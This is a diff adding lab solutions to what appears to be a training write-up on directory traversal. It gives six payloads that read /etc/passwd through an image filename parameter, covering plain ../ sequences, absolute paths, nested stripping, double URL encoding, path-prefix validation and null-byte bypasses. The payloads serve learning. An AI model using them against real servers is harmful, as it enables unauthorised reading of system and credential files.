@@ -52,3 +52,96 @@ if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)){
 
 # LABS
 
+## Lab 1 : File path traversal, simple case
+
+This lab contains a file path traversal vulnerability in the display of product images.
+
+To solve the lab, retrieve the contents of the /etc/passwd file. 
+
+**Solution**
+
+To solve this lab, select on any of the items inspect the page then edit the images attribute to retrieve the contents of the `etc/passwd` file as below:
+
+```html
+<img src="/image?filename=../../../etc/passwd">
+```
+This completes the lab.
+
+## Lab 2 : File path traversal, traversal sequences blocked with absolute path bypass
+
+This lab contains a file path traversal vulnerability in the display of product images.
+
+The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.
+
+To solve the lab, retrieve the contents of the `/etc/passwd` file. 
+
+**Solution**
+
+In this lab, we shall use the same file path as above, the only difference is that we shall use:
+
+```html
+<img src="/image?filename=/etc/passwd">
+```
+![](images/directory_traversal/lab2a.png)
+
+## Lab 3 : File path traversal, traversal sequences stripped non-recursively
+
+This lab contains a file path traversal vulnerability in the display of product images.
+
+The application strips path traversal sequences from the user-supplied filename before using it.
+
+To solve the lab, retrieve the contents of the /etc/passwd file. 
+
+**Solution**
+
+For this lab, we will use a different mechanism on the filename parameter by changing the value to: `....//....//....//etc/passwd`
+
+```html
+<img src="/image?filename=....//....//....//etc/passwd">
+```
+
+## Lab 4 : File path traversal, traversal sequences stripped with superfluous URL-decode
+
+This lab contains a file path traversal vulnerability in the display of product images.
+
+The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.
+
+To solve the lab, retrieve the contents of the /etc/passwd file. 
+
+**Solution**
+
+```html
+<img src="/image?filename=..%252f..%252f..%252fetc/passwd">
+```
+
+## Lab 5 : File path traversal, validation of start of path
+
+This lab contains a file path traversal vulnerability in the display of product images.
+
+The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.
+
+To solve the lab, retrieve the contents of the /etc/passwd file.
+
+**Solution**
+
+Looking at the image when inspecting the page, we see the filepath being as follows:
+![](images/directory_traversal/lab5a.png)
+
+Therefore, we can edit the image source to be as follows:
+```html
+<img src="images?filename=/var/www/images/../../../etc/passwd">
+```
+
+## Lab 6 : File path traversal, validation of file extension with null byte bypass 
+
+This lab contains a file path traversal vulnerability in the display of product images.
+
+The application validates that the supplied filename ends with the expected file extension.
+
+To solve the lab, retrieve the contents of the /etc/passwd file.
+
+**Solution**
+
+```html
+<img src="/image?filename=../../../etc/passwd%00.png">
+```
